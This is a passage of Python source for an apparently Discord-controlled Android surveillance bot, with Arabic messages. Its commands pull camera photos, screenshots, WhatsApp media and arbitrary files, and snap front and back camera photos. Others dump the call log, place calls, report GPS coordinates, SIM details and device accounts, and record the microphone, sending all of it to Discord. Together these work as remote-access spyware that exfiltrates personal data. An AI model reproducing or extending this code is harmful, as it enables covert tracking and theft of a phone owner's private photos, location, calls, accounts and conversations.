            f"⚡ البوت: `{latency:.1f}ms`\n"
            f"🟢 Discord: `{bot.latency * 1000:.1f}ms`"
        )
    )


@bot.tree.command(name="stats", description="إحصائيات الاستخدام")
async def stats_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("stats")
    s = STATS.to_dict()
    top = "\n".join(
        f"`{name}`: {count}" for name, count in s["top_commands"]
    ) or "—"
    errors = "\n".join(
        f"`{name}`: {count}" for name, count in s["errors"].items()
    ) or "لا شيء"

    await interaction.response.send_message(
        f"📊 **إحصائيات البوت:**\n\n"
        f"⏱️ مدة التشغيل: `{s['uptime_human']}`\n"
        f"📁 ملفات مُرسلة: **{s['files_sent']}**\n"
        f"💾 حجم مُرسل: `{s['bytes_sent_human']}`\n"
        f"🎯 إجمالي الأوامر: **{s['total_commands']}**\n\n"
        f"**🏆 الأكثر استخدامًا:**\n{top}\n\n"
        f"**⚠️ الأخطاء:**\n{errors}"
    )


@bot.tree.command(name="whoami", description="معلومات عنك")
async def whoami_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("whoami")
    user = interaction.user
    created = user.created_at.strftime("%Y-%m-%d")
    await interaction.response.send_message(
        f"👤 **{user.name}**\n"
        f"🆔 `{user.id}`\n"
        f"📅 منذ: `{created}`\n"
        f"✅ مصرّح"
    )


@bot.tree.command(name="health", description="فحص صحة البوت")
async def health_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("health")

    with STATE._lock:
        uptime_sec = int(time.time() - STATE.start_time) if STATE.start_time else 0
        is_running = STATE.is_running
        last_error = STATE.last_error
        owner = STATE.owner_id

    lines = [
        "**🏥 Health Report**", "```",
        f"Version      : {VERSION}",
        f"Bot User     : {bot.user}",
        f"Latency      : {round(bot.latency * 1000)}ms",
        f"Guilds       : {len(bot.guilds)}",
        f"Uptime       : {uptime_sec}s",
        f"Commands run : {STATS.to_dict()['total_commands']}",
        f"is_running   : {is_running}",
        f"Owner ID     : {owner or '—'}",
        f"bridge.py    : {'✅' if _BRIDGE_AVAILABLE else '❌'}",
        f"Contacts     : {'✅' if _is_contacts_ready() else '❌'}",
        f"PIL          : {'✅' if HAS_PIL else '❌'}",
        f"Last error   : {last_error or '—'}",
        "```",
    ]
    await interaction.response.send_message("\n".join(lines))


@bot.tree.command(name="clearcache", description="مسح الذاكرة المؤقتة")
async def clearcache_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("clearcache")
    size_before = LIST_CACHE.size()
    LIST_CACHE.clear()
    RATE_LIMITER.reset(interaction.user.id)
    await interaction.response.send_message(
        f"🧹 تم المسح\n"
        f"• Cache: `{size_before}` → `0`\n"
        f"• Rate Limiter: مُعاد تعيينه"
    )


# ═══════════════════════════════════════════════════════════════════
#                       التصفح والملفات
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="browse", description="تصفح حر لأي مسار")
@app_commands.describe(path="المسار (افتراضي: الجذر)")
async def browse_cmd(interaction: discord.Interaction, path: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("browse")
    target = path or ALLOWED_ROOT
    if not is_path_allowed(target):
        await interaction.response.send_message(
            f"❌ **خارج النطاق**\n`{target}`", ephemeral=True)
        return
    if not os.path.isdir(target):
        await interaction.response.send_message(
            f"❌ **ليس مجلدًا**\n`{target}`", ephemeral=True)
        return
    view = FileBrowserView(target, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="storage", description="التخزين الرئيسي")
async def storage_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("storage")
    view = FileBrowserView(ALLOWED_ROOT, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="camera", description="مجلد الكاميرا")
async def camera_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("camera")
    path = _find_dir_in_roots(CAMERA_PATHS)
    if not path:
        await interaction.response.send_message(
            "❌ لم أجد مجلد الكاميرا.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="screenshots", description="لقطات الشاشة")
async def screenshots_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("screenshots")
    path = _find_dir_in_roots(SCREENSHOT_PATHS)
    if not path:
        await interaction.response.send_message(
            "❌ لم أجد مجلد اللقطات.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="downloads", description="التنزيلات")
async def downloads_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("downloads")
    path = _find_dir_in_roots(DOWNLOAD_PATHS)
    if not path:
        await interaction.response.send_message(
            "❌ لم أجد مجلد التنزيلات.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="documents", description="المستندات")
async def documents_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("documents")
    path = _find_dir_in_roots(DOCUMENT_PATHS)
    if not path:
        await interaction.response.send_message(
            "❌ لم أجد مجلد المستندات.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="whatsapp_media", description="وسائط واتساب")
async def whatsapp_media_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("whatsapp_media")
    path = _find_dir_in_roots(WHATSAPP_MEDIA_PATHS)
    if not path:
        await interaction.response.send_message(
            "❌ لم أجد مجلد وسائط واتساب.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="tree", description="شجرة مجلد")
@app_commands.describe(path="المسار", depth="العمق (1-5)")
async def tree_cmd(interaction: discord.Interaction, path: str = None,
                   depth: int = 3):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("tree")
    target = path or ALLOWED_ROOT
    if not is_path_allowed(target) or not os.path.isdir(target):
        await interaction.response.send_message(
            "❌ مسار غير صالح.", ephemeral=True)
        return
    depth = max(1, min(5, depth))
    await interaction.response.defer()
    lines = [f"🌳 `{target}` (عمق {depth})\n"]
    lines.extend(_build_tree(target, max_depth=depth))
    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(
            delete=False, suffix='.txt', mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(
                file=discord.File(tmp.name, filename="tree.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        await interaction.followup.send(f"```\n{text[:1900]}\n```")


@bot.tree.command(name="search", description="بحث متقدم")
@app_commands.describe(name="الاسم أو Regex", regex="استخدام Regex؟",
                        limit="الحد (1-25)")
async def search_cmd(interaction: discord.Interaction, name: str,
                     regex: bool = False, limit: int = 20):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("search")
    limit = max(1, min(25, limit))
    await interaction.response.defer()
    try:
        results = await _find_files(name, DISCOVERED_ROOTS,
                                     max_results=limit, max_depth=8,
                                     use_regex=regex)
    except Exception as e:
        STATS.record_error("search")
        await interaction.followup.send(f"❌ {e}")
        return
    if not results:
        await interaction.followup.send(f"لا نتائج لـ `{name}`.")
        return
    view = FindResultsView(results, name)
    await interaction.followup.send(
        f"🔎 **{len(results)}** نتيجة لـ `{name}`"
        + (" (Regex)" if regex else ""),
        view=view
    )


@bot.tree.command(name="find", description="بحث سريع")
@app_commands.describe(name="جزء من الاسم", limit="الحد (1-20)")
async def find_cmd(interaction: discord.Interaction, name: str,
                    limit: int = 15):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("find")
    limit = max(1, min(20, limit))
    await interaction.response.defer()
    try:
        results = await _find_files(name, DISCOVERED_ROOTS,
                                     max_results=limit, max_depth=6)
    except Exception as e:
        STATS.record_error("find")
        await interaction.followup.send(f"❌ {e}")
        return
    if not results:
        await interaction.followup.send(f"لا نتائج لـ `{name}`.")
        return
    view = FindResultsView(results, name)
    await interaction.followup.send(
        f"🔍 **{len(results)}** نتيجة لـ `{name}`:", view=view)


@bot.tree.command(name="get", description="سحب ملف")
@app_commands.describe(path="المسار")
async def get_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("get")
    await interaction.response.defer()
    await _send_any_file(interaction, path)


@bot.tree.command(name="zip", description="ضغط مجلد")
@app_commands.describe(path="المسار")
async def zip_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("zip")
    await interaction.response.defer()
    await _send_zip_of_dir(interaction, path)


# ═══════════════════════════════════════════════════════════════════
#                       سحب الصور
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="latest", description="آخر الصور")
@app_commands.describe(folder="المجلد", count="العدد (1-10)")
async def latest_cmd(interaction: discord.Interaction, folder: str = None,
                      count: int = 5):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("latest")
    folder = folder or _find_dir_in_roots(CAMERA_PATHS) \
             or os.path.join(ALLOWED_ROOT, "DCIM", "Camera")
    count = max(1, min(10, count))
    await interaction.response.defer()
    try:
        if not is_path_allowed(folder) or not os.path.isdir(folder):
            await interaction.followup.send("❌ مجلد غير صالح.")
            return
        files = [os.path.join(folder, f)
                 for f in os.listdir(folder)
                 if f.lower().endswith((".jpg", ".jpeg", ".png",
                                        ".webp", ".gif", ".heic"))]
        files.sort(key=os.path.getmtime, reverse=True)
        files = files[:count]
        if not files:
            await interaction.followup.send("لا توجد صور.")
            return
        for fp in files:
            compressed = await _compress_image(fp)
            try:
                size = os.path.getsize(compressed)
                await interaction.followup.send(
                    file=discord.File(compressed))
                STATS.record_file(size)
                await asyncio.sleep(0.5)
            except Exception as e:
                await interaction.followup.send(f"تعذر: {e}")
            finally:
                if compressed != fp and os.path.exists(compressed):
                    try:
                        os.remove(compressed)
                    except Exception:
                        pass
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")


@bot.tree.command(name="pull_camera", description="اسحب آخر n صورة")
@app_commands.describe(n="العدد (1-20)")
async def pull_camera_cmd(interaction: discord.Interaction, n: int = 5):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("pull_camera")
    await interaction.response.defer()
    path = _find_dir_in_roots(CAMERA_PATHS)
    if not path:
        await interaction.followup.send("❌ لم أجد مجلد الكاميرا.")
        return
    await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))


@bot.tree.command(name="pull_screens", description="اسحب آخر n لقطة")
@app_commands.describe(n="العدد (1-20)")
async def pull_screens_cmd(interaction: discord.Interaction, n: int = 5):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("pull_screens")
    await interaction.response.defer()
    path = _find_dir_in_roots(SCREENSHOT_PATHS)
    if not path:
        await interaction.followup.send("❌ لم أجد مجلد اللقطات.")
        return
    await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))


@bot.tree.command(name="resume", description="استئناف السحب")
async def resume_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("resume")
    d = bulk_state.get('resume_dir')
    i = bulk_state.get('resume_index', 0)
    if not d:
        await interaction.response.send_message(
            "لا يوجد سحب موقوف.", ephemeral=True)
        return
    await interaction.response.defer()
    bulk_state['suspended'] = False
    await _send_images_bulk(interaction, d, start_index=i)


@bot.tree.command(name="stop", description="أوقف السحب")
async def stop_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("stop")
    bulk_state['suspended'] = True
    await interaction.response.send_message("⛔ سيتم الإيقاف قريبًا.")


# ═══════════════════════════════════════════════════════════════════
#                       التقاط الشاشة والكاميرا
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="screenshot", description="لقطة شاشة")
@app_commands.describe(send="أرسلها لديسكورد؟")
async def screenshot_cmd(interaction: discord.Interaction,
                          send: bool = True):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("screenshot")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    try:
        path = await asyncio.to_thread(_bridge.capture_screen)
    except Exception as e:
        STATS.record_error("screenshot")
        await interaction.followup.send(f"❌ {e}")
        return
    if not path or not os.path.isfile(path):
        await interaction.followup.send(
            "❌ فشل التقاط الشاشة.\n"
            "**ملاحظة:** في Android 11+، التقاط الشاشة الحقيقي "
            "يحتاج MediaProjection."
        )
        return
    size_mb = os.path.getsize(path) / (1024 * 1024)
    if size_mb > DISCORD_LIMIT_MB:
        await interaction.followup.send(f"⚠️ {size_mb:.1f}MB > الحد")
        return
    if send:
        try:
            await interaction.followup.send(
                content=f"📸 لقطة — `{os.path.basename(path)}`",
                file=discord.File(path)
            )
            STATS.record_file(os.path.getsize(path))
        except Exception as e:
            await interaction.followup.send(f"خطأ: {e}")
    else:
        await interaction.followup.send(f"📸 حُفظت في `{path}`")


@bot.tree.command(name="snap_back", description="صورة بالكاميرا الخلفية")
async def snap_back_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("snap_back")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    path = await asyncio.to_thread(_bridge.capture_camera, 0)
    if not path or not os.path.isfile(path):
        await interaction.followup.send(
            "❌ فشل التصوير.\n"
            "تأكد من منح صلاحية الكاميرا."
        )
        return
    try:
        await interaction.followup.send(
            content=f"📷 كاميرا خلفية — `{os.path.basename(path)}`",
            file=discord.File(path)
        )
        STATS.record_file(os.path.getsize(path))
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}\n`{path}`")


@bot.tree.command(name="snap_front", description="صورة بالكاميرا الأمامية")
async def snap_front_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("snap_front")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    path = await asyncio.to_thread(_bridge.capture_camera, 1)
    if not path or not os.path.isfile(path):
        await interaction.followup.send(
            "❌ فشل التصوير.\n"
            "تأكد من منح صلاحية الكاميرا."
        )
        return
    try:
        await interaction.followup.send(
            content=f"🤳 كاميرا أمامية — `{os.path.basename(path)}`",
            file=discord.File(path)
        )
        STATS.record_file(os.path.getsize(path))
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}\n`{path}`")


@bot.tree.command(name="camera_app", description="افتح تطبيق الكاميرا")
async def camera_app_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("camera_app")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    result = await asyncio.to_thread(_bridge.open_camera_app)
    await interaction.followup.send(result)


# ═══════════════════════════════════════════════════════════════════
#                       ✅ سجل المكالمات (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="calllog", description="📞 سجل المكالمات")
@app_commands.describe(
    limit="العدد (1-100)",
    type_filter="all | incoming | outgoing | missed",
    search="بحث برقم أو اسم"
)
async def calllog_cmd(
    interaction: discord.Interaction,
    limit: int = 20,
    type_filter: str = "all",
    search: str = None
):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("calllog")
    limit = max(1, min(100, limit))
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(
            _bridge.get_call_log, limit, type_filter or "all", search or ""
        )
        entries = json.loads(data) if data else []
    except Exception as e:
        STATS.record_error("calllog")
        await interaction.followup.send(f"❌ {e}")
        return

    if isinstance(entries, dict) and entries.get("status") == "permission_denied":
        await interaction.followup.send(
            "❌ **صلاحية سجل المكالمات غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **سجل المكالمات**"
        )
        return

    if not entries:
        await interaction.followup.send("📞 لا توجد مكالمات مطابقة.")
        return

    # أيقونة حسب النوع
    type_icons = {
        "incoming": "📥",
        "outgoing": "📤",
        "missed": "❌",
        "rejected": "🚫",
        "blocked": "⛔",
        "voicemail": "📧",
    }

    lines = [f"📞 **{len(entries)} مكالمة:**\n"]
    for c in entries[:25]:
        icon = type_icons.get(c.get("type", "unknown"), "📱")
        name = c.get("name", "غير معروف")
        number = c.get("number", "?")
        date = c.get("date_str", "")
        duration = c.get("duration_str", "0s")
        is_new = "🆕 " if c.get("is_new") else ""
        lines.append(
            f"{is_new}{icon} **{name}**\n"
            f"   `{number}` · {duration}\n"
            f"   ⏰ {date}\n"
        )
    if len(entries) > 25:
        lines.append(f"... و {len(entries)-25} أخرى")

    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(
            delete=False, suffix='.txt', mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(
                file=discord.File(tmp.name, filename="calllog.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        await interaction.followup.send(text)


# ═══════════════════════════════════════════════════════════════════
#                       ✅ إجراء مكالمة (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="call", description="☎️ إجراء مكالمة مباشرة")
@app_commands.describe(phone="رقم الهاتف")
async def call_cmd(interaction: discord.Interaction, phone: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("call")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    if not _bridge.has_call_permission():
        await interaction.followup.send(
            "❌ **صلاحية إجراء المكالمات غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الهاتف**"
        )
        return

    result = await asyncio.to_thread(_bridge.call_number, phone)
    await interaction.followup.send(result)


# ═══════════════════════════════════════════════════════════════════
#                       ✅ معلومات الهاتف (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="phoneinfo", description="📱 معلومات الهاتف والشبكة")
async def phoneinfo_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("phoneinfo")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.get_phone_info)
        info = json.loads(data) if data else {}
    except Exception as e:
        STATS.record_error("phoneinfo")
        await interaction.followup.send(f"❌ {e}")
        return

    if info.get("status") == "permission_denied":
        await interaction.followup.send(
            "❌ **صلاحية معلومات الهاتف غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الهاتف**"
        )
        return

    lines = ["📱 **معلومات الهاتف:**\n"]
    if info.get("network_operator"):
        lines.append(f"📡 **الشبكة:** `{info['network_operator']}`")
    if info.get("network_operator_code"):
        lines.append(f"   الكود: `{info['network_operator_code']}`")
    if info.get("sim_operator"):
        lines.append(f"💳 **SIM:** `{info['sim_operator']}`")
    if info.get("sim_operator_code"):
        lines.append(f"   الكود: `{info['sim_operator_code']}`")
    if info.get("sim_country"):
        lines.append(f"🌍 **بلد SIM:** `{info['sim_country']}`")
    if info.get("network_country"):
        lines.append(f"🌍 **بلد الشبكة:** `{info['network_country']}`")
    if info.get("phone_number"):
        lines.append(f"📞 **رقم الهاتف:** `{info['phone_number']}`")
    if info.get("sim_state"):
        lines.append(f"💠 **حالة SIM:** `{info['sim_state']}`")
    if info.get("phone_type"):
        lines.append(f"📶 **نوع الهاتف:** `{info['phone_type']}`")
    if info.get("network_type"):
        lines.append(f"🌐 **نوع الشبكة:** `{info['network_type']}`")
    if "is_roaming" in info:
        roam = "✅ نعم" if info["is_roaming"] else "❌ لا"
        lines.append(f"✈️ **التجوال:** {roam}")

    await interaction.followup.send("\n".join(lines))


# ═══════════════════════════════════════════════════════════════════
#                       ✅ الموقع GPS (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="gps", description="📍 الموقع الجغرافي الدقيق")
async def gps_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("gps")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.get_location)
        loc = json.loads(data) if data else {}
    except Exception as e:
        STATS.record_error("gps")
        await interaction.followup.send(f"❌ {e}")
        return

    if loc.get("status") == "permission_denied":
        await interaction.followup.send(
            "❌ **صلاحية الموقع غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الموقع**"
        )
        return

    if loc.get("status") == "no_location":
        await interaction.followup.send(
            "❌ **لا يوجد موقع معروف**\n"
            "فعّل GPS ثم افتح خرائط Google مرة واحدة."
        )
        return

    if not loc.get("latitude"):
        await interaction.followup.send("❌ لم أتمكن من قراءة الموقع.")
        return

    lat = loc.get("latitude")
    lon = loc.get("longitude")
    acc = loc.get("accuracy_m", 0)
    alt = loc.get("altitude_m", 0)
    provider = loc.get("provider", "?")
    maps = loc.get("maps_url", "")

    await interaction.followup.send(
        f"📍 **الموقع الحالي:**\n\n"
        f"🌐 **الإحداثيات:**\n"
        f"   Latitude: `{lat}`\n"
        f"   Longitude: `{lon}`\n\n"
        f"🎯 **الدقة:** `{acc:.1f}m`\n"
        f"⛰️ **الارتفاع:** `{alt:.1f}m`\n"
        f"📡 **المصدر:** `{provider}`\n\n"
        f"🗺️ [افتح في خرائط Google]({maps})"
    )


@bot.tree.command(name="gps_providers",
                   description="📡 حالة مزوّدي خدمة الموقع")
async def gps_providers_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("gps_providers")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.get_location_providers)
        providers = json.loads(data) if data else {}
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return

    if not providers:
        await interaction.followup.send("❌ لم أتمكن من قراءة المزوّدين.")
        return

    def m(b):
        return "✅" if b else "❌"

    lines = [
        "📡 **حالة مزوّدي الموقع:**\n",
        f"{m(providers.get('gps'))} 🛰️ GPS",
        f"{m(providers.get('network'))} 🌐 Network",
        f"{m(providers.get('passive'))} 📶 Passive",
    ]
    if "location_enabled" in providers:
        lines.append(
            f"{m(providers['location_enabled'])} 🔓 خدمة الموقع العامة"
        )
    if providers.get("all_providers"):
        lines.append(
            f"\n**المتوفرة:** "
            + ", ".join(f"`{p}`" for p in providers["all_providers"])
        )
    await interaction.followup.send("\n".join(lines))


# ═══════════════════════════════════════════════════════════════════
#                       ✅ تسجيل الصوت (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="record",
                   description="🎤 بدء تسجيل صوتي من الميكروفون")
@app_commands.describe(duration="المدة بالثواني (1-600)")
async def record_cmd(interaction: discord.Interaction, duration: int = 10):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("record")
    duration = max(1, min(600, duration))
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    if _bridge.is_audio_recording():
        await interaction.followup.send(
            "⚠️ يوجد تسجيل جارٍ بالفعل.\n"
            "استخدم `/record_stop` لإيقافه."
        )
        return

    result = await asyncio.to_thread(_bridge.start_audio_recording, duration)
    await interaction.followup.send(result)


@bot.tree.command(name="record_stop", description="⏹️ إيقاف التسجيل وإرساله")
async def record_stop_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("record_stop")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    if not _bridge.is_audio_recording():
        await interaction.followup.send("⚠️ لا يوجد تسجيل جارٍ.")
        return

    path = await asyncio.to_thread(_bridge.stop_audio_recording)
    if not path or not os.path.isfile(path):
        await interaction.followup.send("❌ لم يتم العثور على ملف التسجيل.")
        return

    size_mb = os.path.getsize(path) / (1024 * 1024)
    if size_mb > DISCORD_LIMIT_MB:
        await interaction.followup.send(
            f"⚠️ الحجم {size_mb:.1f}MB > الحد\n`{path}`"
        )
        return

    try:
        await interaction.followup.send(
            content=f"🎤 تسجيل صوتي — `{os.path.basename(path)}`",
            file=discord.File(path)
        )
        STATS.record_file(os.path.getsize(path))
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}\n`{path}`")


@bot.tree.command(name="record_status", description="📊 حالة التسجيل الحالي")
async def record_status_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("record_status")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    is_rec = _bridge.is_audio_recording()
    if not is_rec:
        await interaction.followup.send("⏹️ لا يوجد تسجيل جارٍ.")
        return

    dur = _bridge.get_recording_duration()
    await interaction.followup.send(
        f"🎤 **التسجيل الجاري**\n"
        f"⏱️ المدة: `{dur}s`\n"
        f"استخدم `/record_stop` للإيقاف."
    )


# ═══════════════════════════════════════════════════════════════════
#                       ✅ الحسابات (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="accounts", description="🔑 الحسابات على الجهاز")
@app_commands.describe(filter_type="فلترة (google, whatsapp, ...)")
async def accounts_cmd(interaction: discord.Interaction,
                        filter_type: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("accounts")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(
            _bridge.get_accounts, filter_type or "")
        accounts = json.loads(data) if data else []
    except Exception as e:
        STATS.record_error("accounts")
        await interaction.followup.send(f"❌ {e}")
        return

    if isinstance(accounts, dict) and accounts.get("status") == "permission_denied":
        await interaction.followup.send(
            "❌ **صلاحية الوصول للحسابات غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الحسابات**"
        )
        return

    if not accounts:
        await interaction.followup.send("🔑 لا توجد حسابات مطابقة.")
        return

    # تجميع حسب النوع
    grouped = defaultdict(list)
    for acc in accounts:
        grouped[acc.get("type_short", "Other")].append(acc.get("name", "?"))

    lines = [f"🔑 **{len(accounts)} حساب:**\n"]
    for type_name, names in sorted(grouped.items()):
        lines.append(f"\n**{type_name}** ({len(names)}):")
        for name in names[:10]:
            lines.append(f"  • `{name}`")
        if len(names) > 10:
            lines.append(f"  ... و {len(names)-10} أخرى")

    text = "\n".join(lines)
    await interaction.followup.send(text[:1900])


# ═══════════════════════════════════════════════════════════════════
#                       ✅ المستشعرات (جديد)
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="sensors", description="❤️ قائمة كل المستشعرات")
async def sensors_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("sensors")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.list_sensors)
        sensors = json.loads(data) if data else []
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return

    if not sensors:
        await interaction.followup.send("❌ لا توجد مستشعرات.")
        return

    lines = [f"❤️ **{len(sensors)} مستشعر:**\n"]
    for s in sensors[:30]:
        lines.append(
            f"• **{s.get('type_name', '?')}**\n"
            f"  `{s.get('name', '?')}` — "
            f"{s.get('vendor', '?')}"
        )
    if len(sensors) > 30:
        lines.append(f"\n... و {len(sensors)-30} أخرى")

    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(
            delete=False, suffix='.txt', mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(
                file=discord.File(tmp.name, filename="sensors.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        await interaction.followup.send(text)


@bot.tree.command(name="heartbeat", description="❤️ قراءة نبضات القلب")
async def heartbeat_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("heartbeat")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.read_heart_rate)
        result = json.loads(data) if data else {}
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await interaction.followup.send(
            "❌ **الجهاز لا يحتوي على مستشعر نبضات القلب.**"
        )
        return
    if result.get("status") == "timeout":
        await interaction.followup.send(
            "⏰ **لم يحصل قراءة** خلال 5 ثوان.\n"
            "تأكد من لمس المستشعر بإصبعك."
        )
        return
    if result.get("status") == "permission_denied":
